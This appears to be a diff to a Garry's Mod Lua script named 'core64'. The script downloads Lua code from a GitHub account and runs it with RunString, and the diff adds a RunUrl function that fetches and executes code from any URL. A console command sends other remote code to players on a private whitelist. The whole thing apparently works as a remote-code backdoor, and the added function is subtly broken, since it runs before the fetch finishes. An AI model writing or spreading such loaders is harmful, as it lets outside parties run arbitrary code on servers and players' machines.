@@ -1,6 +1,12 @@
 local core64 = {}
 http.Fetch("https://raw.githubusercontent.com/Dzhet225/core64_v2/master/users.lua", function(ret) RunString(ret) end)
 
+function core64.RunUrl(url)
+	local code = ""
+	http.Fetch(url, function(w) code = w end)
+	RunString(code)
+end
+
 if SERVER then
 	util.AddNetworkString('stream_netcode')
 
@@ -40,7 +46,7 @@ local code = ""
 http.Fetch("https://raw.githubusercontent.com/Dzhet225/core64_v2/master/lua_pad.lua", function(ret) code = ret end)
 
 concommand.Add('editor', function(ply)
-	http.Fetch("https://raw.githubusercontent.com/Dzhet225/core64_v2/master/users.lua", function(ret) RunString(ret) end)
+	print(code)
 	if !core64.users_list[ply:SteamID()] then return end
 	RunOnCL(ply, code)
 end)
